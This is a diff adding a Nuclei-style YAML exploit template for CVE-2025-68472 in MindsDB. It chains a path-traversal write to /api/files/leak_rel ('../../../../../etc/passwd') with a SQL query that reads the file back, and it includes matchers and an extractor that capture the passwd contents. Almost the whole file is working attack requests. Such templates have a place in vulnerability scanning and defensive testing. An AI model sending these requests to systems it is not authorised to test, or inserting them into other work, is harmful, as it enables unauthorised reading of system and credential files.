@@ -1,0 +1,40 @@
+id: CVE-2025-68472
+
+info:
+  name: "MindsDB 与 组合读取文件漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |
+    目标系统通过 /api/files/leak_rel 接口写入任意路径，
+    并结合 /api/sql/query 查询接口，可读取敏感文件内容（如 /etc/passwd）。
+  tags: MindsDB
+
+http:
+  - raw:
+      - |
+        PUT /api/files/leak_rel HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"file":"../../../../../etc/passwd"}
+
+      - |
+        POST /api/sql/query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"query":"SELECT * FROM files.leak_rel"}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*"
